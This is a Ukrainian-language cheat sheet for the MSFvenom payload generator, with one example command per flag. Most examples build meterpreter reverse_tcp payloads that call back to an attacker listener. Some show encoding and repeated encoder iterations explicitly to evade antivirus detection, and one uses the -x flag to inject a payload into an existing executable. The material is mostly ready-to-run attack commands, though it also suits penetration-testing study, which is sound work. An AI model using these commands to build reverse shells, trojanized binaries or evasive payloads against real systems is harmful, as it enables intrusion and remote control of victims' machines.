
# Команди MSFvenom

Цей документ містить список основних команд MSFvenom з поясненнями українською мовою для ефективної роботи з інструментом.

## Основні команди

1. **-p**  
   Вказує тип payload для створення шкідливого файлу.  
   **Приклад**:  
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf > payload.elf
   ```

2. **-f**  
   Вказує формат файлу, який буде створений. Може бути elf, exe, asp, php, і багато інших.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe
   ```

3. **-a, --arch**  
   Вказує архітектуру цільової системи (x86, x64, arm).  
   **Приклад**:  
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -a x86 > payload.elf
   ```

4. **-b**  
   Вказує символи, яких слід уникати в payload, щоб не порушити працюючі процеси або системи.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -b "\00" -f exe > payload.exe
   ```

5. **-e**  
   Вказує енкодер для захисту payload. Це дозволяє приховати payload від антивірусів.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe
   ```

6. **-x**  
   Вказує шлях до існуючого виконуваного файлу для його зараження.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -x /path/to/existing.exe -f exe > infected.exe
   ```

7. **-i**  
   Вказує кількість ітерацій енкодера, щоб зробити payload важче для детектування.  
   **Приклад**:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
   ```

8. **-l**  
   Виводить список всіх доступних payloads.  
   **Приклад**:  
   ```bash
   msfvenom -l
   ```

10. **-h**  
    Виводить довідку про використання MSFvenom та його параметри.  
    **Приклад**:  
    ```bash
    msfvenom -h
    ```

11. **--platform**  
    Вказує платформу для payload (наприклад, Windows, Linux, Android).  
    **Приклад**:  
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --platform windows -f exe > payload.exe
    ```

13. **--payload**  
    Вказує конкретний payload для генерації.  
    **Приклад**:  
    ```bash
    msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe
    ```

15. **-o**  
    Вказує ім’я файлу, у який буде збережено payload.  
    **Приклад**:  
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -o payload.exe
    ```


